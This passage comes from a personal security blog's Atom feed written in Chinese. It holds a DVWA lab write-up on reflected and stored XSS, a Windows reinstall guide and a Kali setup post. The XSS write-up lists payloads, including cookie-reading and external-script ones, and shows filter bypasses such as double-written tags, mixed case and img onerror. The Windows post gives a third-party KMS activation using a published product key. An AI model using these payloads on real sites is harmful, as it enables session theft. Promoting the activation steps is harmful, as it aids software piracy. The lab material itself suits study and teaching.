class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。以防止浏览器将其作为HTML元素。这样会将用户输入的内容都不作为标签以提高安全性。<br>预定义的字符是：</p><pre><code>&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&apos; （单引号）成为 &apos;&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt;</code></pre><p>一些常用的xss语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/test/)&lt;/script&gt; 最普通的xss代码</span><br><span class="line">&lt;script&gt;alert(document.cookie);&lt;/script&gt; 获取cookie</span><br><span class="line">&lt;img src=&quot;javascript:alert(/test/)&quot;&gt; img链接地址xss</span><br><span class="line">&lt;script src=&quot;test.js&quot;&gt; &lt;script&gt; 外部调用攻击代码ls.js</span><br><span class="line">&lt;script alert(&apos;test)&lt;/SCRIPT&gt; 注释方法防止过滤</span><br><span class="line">&lt;img src=&quot;&quot; onerror=alert(&quot;xss&quot;)&gt; 加载图像失败执行</span><br><span class="line">&lt;iframe onload=alert(&apos;test&apos;)&gt; 框架</span><br><span class="line">&lt;script&gt;location=&apos;test.com&apos;;&lt;/script&gt; 跳转某页面</span><br></pre></td></tr></table></figure></p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><h5 id="等级Low-1"><a href="#等级Low-1" class="headerlink" title="等级Low"></a>等级Low</h5><p>源代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h6 id="部分函数讲解"><a href="#部分函数讲解" class="headerlink" title="部分函数讲解"></a>部分函数讲解</h6><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。<br>相关函数：</p><pre><code>ltrim() - 移除字符串左侧的空白字符或其他预定义字符rtrim() - 移除字符串右侧的空白字符或其他预定义字符</code></pre><p>stripslashes()：删除由 addslashes() 函数添加的反斜杠。该函数用于清理从数据库或 HTML 表单中取回的数据。(若是连续二个反斜杠，则去掉一个，保留一个；若只有一个反斜杠，就直接去掉。)；<br>mysqli_real_escape_string：转义字符串中的特殊字符；</p><p>name栏输入发现有字数限制，那就抓包改数据；<br><img src="https://upload-images.jianshu.io/upload_images/9464729-7c8e576b98babe91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="抓包"><br>message栏正常输入即可，<code>&lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-211dc5368255042b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h5 id="等级Medium-1"><a href="#等级Medium-1" class="headerlink" title="等级Medium"></a>等级Medium</h5><p>源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>部分函数讲解<br><figure class="highlight plain"><figcaption><span>函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用`<b>`标签。</b></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">```addslashes()``` 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</span><br><span class="line">其对message参数使用了`htmlspecialchars`函数进行编码，因此无法对message参数注入XSS代码，但是对于name参数，简单过滤了`&lt;script&gt;`字符串，仍然存在存储型的XSS。</span><br><span class="line">使用双写`&lt;scri&lt;script&gt;pt&gt;alert(&apos;test&apos;)`</span><br><span class="line">![改包](https://upload-images.jianshu.io/upload_images/9464729-3a7307e13813a512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">成功弹框</span><br><span class="line">![medium](https://upload-images.jianshu.io/upload_images/9464729-619ffba35aee9ede.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">大小写混合绕过`&lt;sCrIpt&gt;alert(&apos;test&apos;)`</span><br><span class="line">##### 等级High</span><br><span class="line">源代码：</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;btnSign&apos; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );</span><br><span class="line">    $name    = trim( $_POST[ &apos;txtName&apos; ] );</span><br><span class="line"></span><br><span class="line">    // Sanitize message input</span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    // Sanitize name input</span><br><span class="line">    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );</span><br><span class="line">    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">    // Update database</span><br><span class="line">    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;</span><br><span class="line">    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>这里使用正则表达式过滤了<code>&lt;script&gt;</code>标签，但是依然存在<code>img、iframe</code>等其它危险的标签，因此name参数仍然有存储型XSS<br>抓包改name数据<code>=&lt;img src=1 onerror=alert(&#39;test&#39;)&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-1e4aa05bb6b8bf55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="bao.png"><br>成功弹框<br><img src="https://upload-images.jianshu.io/upload_images/9464729-0b8b33fa05ceba20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h5 id="等级Impossible-1"><a href="#等级Impossible-1" class="headerlink" title="等级Impossible"></a>等级Impossible</h5><p>源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':message'</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':name'</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个就比较高级了，对name和message均进行了<code>htmlspecialchars</code>过滤</p><h6 id="存储型和反射型的区别"><a href="#存储型和反射型的区别" class="headerlink" title="存储型和反射型的区别"></a>存储型和反射型的区别</h6><ul><li>存储型<br>存储型XSS，持久型，代码是存储在服务器中的，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</li><li>反射型<br>反射型XSS，非持久化，需要欺骗用户手动去点击链接才能触发XSS代码，一般容易出现在搜索页面。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前期准备：linux下搭建dvwa需要lamp环境，其php版本不能太高，php7.0无法使用，php5.6可以;&lt;/p&gt;
&lt;h4 id=&quot;XSS定义&quot;&gt;&lt;a href=&quot;#XSS定义&quot; class=&quot;headerlink&quot; title=&quot;XSS定义&quot;&gt;&lt;/a&gt;XSS定义&lt;
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
      <category term="XSS" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Win resystem</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/19/system/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/19/system/</id>
    <published>2018-04-19T02:14:17.000Z</published>
    <updated>2018-04-19T02:15:40.327Z</updated>
    
    <content type="html"><![CDATA[<p>首先要有一个U盘启动盘或者装机光盘；</p><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- ```Launch CSm```关闭</span><br><span class="line">- ```Security Boot```选择```Disable</span><br></pre></td></tr></table></figure></h2><p>修改完成后按F10保存并退出<br>接下来就该修改磁盘格式为GPT格式了，进入安装界面时按住<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 首先输入```diskpart</span><br></pre></td></tr></table></figure></p><ul><li><p>进入磁盘操作界面<figure class="highlight plain"><figcaption><span>disk```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 查看磁盘名及类型```select disk 0</span><br></pre></td></tr></table></figure></p></li><li><p>清除磁盘格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 安装``win10``需要格式化为gpt格式```convert gpt</span><br></pre></td></tr></table></figure></p></li><li><p>格式化完成后进行分区<figure class="highlight plain"><figcaption><span>paraition ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- 创建```EFI```分区，执行```create partition efi size=200```（分区大小为200MB）</span><br><span class="line">- 创建``MSR``分区，执行```create partition msr size=200```（微软系统保留分区）</span><br><span class="line">- 创建主分区，执行```create partition primary size=xxx```（具体大小根据你的要求而定，作为系统分区来说，如果有足够空间，可以留出大于100GB即102400MB的空间，命令为```create partition primary size=102400```，方便系统有足够周转空间）</span><br><span class="line">- 如果还有剩余空间，可继续重复执行上述命令来创建新的分区（注意修改具体数值）。但建议用户创建完系统分区后就退出命令提示符继续安装系统，毕竟这种方式不容易估算剩下的硬盘空间大小，进入安装程序后可以进一步划分剩余空间，也可以在安装结束后，进入系统磁盘管理中进行分配</span><br><span class="line">- 企业版win10激活方法，鼠标右击```win```键，点击```Windows Powershell（管理员）```，依次输入一下命令，如若序列号不可使用，请百度最新win10企业版序列号替换即可，也可以使用Windows激活工具进行激活</span><br><span class="line">```slmgr.vbs /upk</span><br><span class="line">slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43</span><br><span class="line">slmgr /skms zh.us.to</span><br><span class="line">slmgr /ato</span><br></pre></td></tr></table></figure></p></li></ul><h2 id="二、安装Win7"><a href="#二、安装Win7" class="headerlink" title="二、安装Win7"></a>二、安装Win7</h2><p>听说现在新版电脑不再支持安装Win7了，当然如果你的电脑支持安装Win7，最好不过了。<br>按<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 修改```Lanuch CMS```为```Enable</span><br></pre></td></tr></table></figure></p><ul><li><figure class="highlight plain"><figcaption><span>Boot```选择```Disable```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修改完成后按F10保存并退出</span><br><span class="line">接下来就该修改磁盘格式了，进入安装界面时按住```Shift+F10```，进入命令行，</span><br><span class="line">- 首先输入```diskpart</span><br></pre></td></tr></table></figure></li><li><p>进入磁盘操作界面<figure class="highlight plain"><figcaption><span>disk```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 查看磁盘名及类型```select disk 0</span><br></pre></td></tr></table></figure></p></li><li><p>清除磁盘格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 安装``win7``需要格式化为MBR格式```convert mbr</span><br></pre></td></tr></table></figure></p></li></ul><p>操作完成后输入<code>exit</code>退出<br>到选择安装系统到哪个磁盘时再进行分区，这是<code>Win7</code>与<code>Win10</code>的不同，分多内存看自己电脑磁盘空间大小，C盘建议分100GB即可，此时电脑会自动分出100MB内存给系统默认分区，选择系统盘时选择自己刚刚创建的100GB的分区就可以，其它剩余的内存安装好系统后进去磁盘管理再分区会更加方便。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先要有一个U盘启动盘或者装机光盘；&lt;/p&gt;
&lt;h2 id=&quot;一、安装&quot;&gt;&lt;a href=&quot;#一、安装&quot; class=&quot;headerlink&quot; title=&quot;一、安装&quot;&gt;&lt;/a&gt;一、安装&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Windows/"/>
    
    
      <category term="Windows" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>kali</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/11/kali/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/11/kali/</id>
    <published>2018-04-11T01:05:48.000Z</published>
    <updated>2018-05-13T07:21:29.813Z</updated>
    
    <content type="html"><![CDATA[<p>kali2018-1安装<br>官网下载:<em><a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">https://www.kali.org/downloads/</a></em><br>出处<em><a href="http://www.weixianmanbu.com/article/2336.html" target="_blank" rel="noopener">http://www.weixianmanbu.com/article/2336.html</a></em></p><h3 id="Vmtools问题"><a href="#Vmtools问题" class="headerlink" title="Vmtools问题"></a>Vmtools问题</h3><p>成功安装Vmtools后仍然无法使用文件复制粘贴，(在2016 rolling版本后遗弃了vmtools)<br>就放弃了Vmtools，改用open-vmtools<br>先改kali源<br>vi /etc/apt/sources.list<br>中科大更新源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>然后<code>apt-get install open-vm-tools-desktop fuse</code><br>再<code>reboot</code>即可</p><h3 id="mysql任意密码登录问题"><a href="#mysql任意密码登录问题" class="headerlink" title="mysql任意密码登录问题"></a>mysql任意密码登录问题</h3><p><code>mysql -u root</code>，进入mysql，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;youpassword&apos; WITH GRANT OPTION; #youpassword你的新密码</span><br><span class="line">flush privileges; #刷新一下</span><br></pre></td></tr></table></figure></p><h3 id="配置ssh远程登录"><a href="#配置ssh远程登录" class="headerlink" title="配置ssh远程登录"></a>配置ssh远程登录</h3><p>一、修改ssh配置<br>1、修改sshd_config文件，命令为：<br>vi /etc/ssh/sshd_config<br>将#PasswordAuthentication no的注释去掉，参数为yes<br>2、将PermitRootLogin without-password修改为<br>PermitRootLogin yes<br><img src="https://upload-images.jianshu.io/upload_images/9464729-f06da06f78fb9295.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>保存，退出vim<br>二、启动ssh服务<br>命令为：<br><code>/etc/init.d/ssh start</code><br>或者<br><code>service ssh start</code><br>查看SSH服务状态是否正常运行，命令为：<br><code>/etc/init.d/ssh status</code><br>或者<br><code>service ssh status</code><br>如有其他问题可参考<em><a href="https://jingyan.baidu.com/article/eae07827a3e6bc1fec5485e3.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/eae07827a3e6bc1fec5485e3.html</a></em></p><h3 id="配置ssh免密"><a href="#配置ssh免密" class="headerlink" title="配置ssh免密"></a>配置ssh免密</h3><p>修改sshd_config 文件， 将#PasswordAuthentication yes的注释（“#”号）去掉，然后保存退出<br><code>vim /etc/ssh/sshd_config</code><br>生成密钥<br><code>ssh-keygen -t rsa</code><br>追加文件<br><code>cat id_rsa.pub &gt;&gt; authorized_keys</code><br>修改文件权限<br><code>chmod 600 authorized_keys</code><br><code>cd /root/.ssh/</code><br>ls<br><code>authorized.keys  id_rsa  id_rsa.pub  known_hosts</code><br>将ssh服务加入开机自启<br><code>update-rc.d ssh enable</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;kali2018-1安装&lt;br&gt;官网下载:&lt;em&gt;&lt;a href=&quot;https://www.kali.org/downloads/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.kali.org/downloads/&lt;/a&gt;&lt;/em
      
    
    </summary>
    
      <category term="Linux" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/09/文件包含漏洞/</id>
    <published>2018-04-09T15:17:16.000Z</published>
    <updated>2018-06-07T11:01:14.152Z</updated>
    
